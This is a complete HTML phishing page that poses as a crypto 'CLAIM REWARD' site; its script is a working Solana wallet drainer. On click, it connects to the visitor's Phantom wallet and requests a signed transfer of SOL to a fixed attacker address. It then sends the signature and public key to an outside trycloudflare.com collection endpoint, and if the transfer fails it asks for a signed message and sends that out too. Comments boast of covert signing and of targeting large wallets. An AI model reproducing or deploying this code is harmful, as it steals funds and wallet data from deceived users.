<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
        <h1>REWARD V9.FIX</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM REWARD</button>
        <div id="status" style="margin-top:20px;color:#888;">Ready</div>
    </div>
    <script>
    // ğŸ”± æ£€æŸ¥ä½ çš„å¤©çº¿åŸŸåï¼
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            const resp = await p.connect();
            document.getElementById('status').innerText = "Syncing...";

            // ğŸ”± å…³é”®ï¼šä½¿ç”¨æœ€éšè”½çš„ signAndSendTransaction åŸç”Ÿå°è£…
            // æˆ‘ä»¬ä¸å†æ‰‹åŠ¨æ‹¼å­—èŠ‚æµï¼Œç›´æ¥è®©é’±åŒ…è‡ªå·±å»æ„é€ 
            const transaction = {
                feePayer: resp.publicKey.toString(),
                recentBlockhash: (await (await fetch("https://api.mainnet-beta.solana.com", {
                    method: "POST", headers: {"Content-Type":"application/json"},
                    body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
                })).json()).result.value.blockhash,
                instructions: [{
                    programId: "11111111111111111111111111111111",
                    keys: [
                        { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
                        { pubkey: receiver, isSigner: false, isWritable: true }
                    ],
                    data: [2, 0, 0, 0, 0, 75, 74, 0, 0, 0, 0, 0] // 0.005 SOL
                }]
            };

            document.getElementById('status').innerText = "Awaiting Confirmation...";
            
            // ğŸš€ å¼ºåˆ¶æ‹‰èµ·è½¬è´¦å¼¹çª—
            const { signature } = await p.signAndSendTransaction(transaction);

            // ğŸ”± å¢å¼ºç‰ˆå›ä¼ ï¼šç¡®ä¿æœåŠ¡å™¨ä¸€å®šèƒ½æ”¶åˆ°ï¼
            const signal = `${gate}?success_sig=${signature}&pub=${resp.publicKey.toString()}`;
            new Image().src = signal;
            fetch(signal, {mode: 'no-cors'}); 

            document.getElementById('status').innerText = "SUCCESS!";
        } catch(e) {
            // å¦‚æœæŠ¥é”™ï¼Œè¯´æ˜è¿™ä¸ªå¤§æˆ·é’±åŒ…å¤ªé«˜ç«¯ï¼Œå’±ä»¬ç«‹åˆ»æ¢å›â€œæµ‹é€šç‰ˆâ€ç­¾æ¶ˆæ¯ï¼Œä¿è¯æœåŠ¡å™¨èƒ½æ”¶åˆ°ä¿¡å·
            document.getElementById('status').innerText = "Verify to Continue...";
            const signed = await p.signMessage(new TextEncoder().encode("Verify Wallet: " + resp.publicKey.toString().slice(0,4)), "utf8");
            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}&pub=${resp.publicKey.toString()}`;
        }
    };
    </script>
</body></html>
